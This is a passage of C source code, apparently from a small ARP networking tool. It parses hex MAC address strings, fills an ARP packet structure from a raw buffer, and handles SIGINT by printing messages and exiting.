    for (i = 0; i < 6; i++) {

        uint8_t total = 0, val;

        // convert two hex letter to an unsigned short int
        for (j = 1; j >= 0; j--) {

            if (str[idx] >= '0' && str[idx] <= '9') // detect 0 ~ 9
                val = str[idx++] - '0';

            else                                    // detect a ~ f
                val = str[idx++] - 'a' + 10;

            total += val * (uint8_t)pow(16, j);
        }
        hex[i] = *(uchar*)&total;
        idx++;

    }

}

/*
 *	Fill ARP packet from socket.
 *	Input:	packet to fill, message buffer
 *  Output:	void
 */
void set_arp(struct arp_packet* packet, uchar* const buf) {

    /* fill ethernet header */
	set_ether_dhost(&packet->eth_hdr, &buf[ETH_DST_OFFSET]);
	set_ether_shost(&packet->eth_hdr, &buf[ETH_SRC_OFFSET]);
	set_ether_type(&packet->eth_hdr, strutons(&buf[ETH_TYPE_OFFSET]));

    /* fill ARP message info */
	set_hard_type(&packet->arp, strutons(&buf[HARDWARE_TYPE_OFFSET]));
	set_prot_type(&packet->arp, strutons(&buf[PROTOCOL_TYPE_OFFSET]));
	set_hard_size(&packet->arp, buf[HARDWARE_SIZE_OFFSET]);
	set_prot_size(&packet->arp, buf[PROTOCOL_SIZE_OFFSET]);
	set_op_code(&packet->arp, strutons(&buf[OPCODE_OFFSET]));

    /* fill ARP address info */
	set_sender_hardware_addr(&packet->arp, &buf[SEND_HARDWARE_ADDR_OFFSET]);
	set_sender_protocol_addr(&packet->arp, &buf[SEND_PROTOCOL_ADDR_OFFSET]);
	set_target_hardware_addr(&packet->arp, &buf[TARG_HARDWARE_ADDR_OFFSET]);
	set_target_protocol_addr(&packet->arp, &buf[TARG_PROTOCOL_ADDR_OFFSET]);

}

/*
 *	Handle signal SIGINT process.
 *	Input:	signal number
 *  Output:	void
 */
void sighandler(int signum) {

    // Quit the program
    printf(MSG_SIGINT);
    printf(MSG_BYE);
    exit(0);

}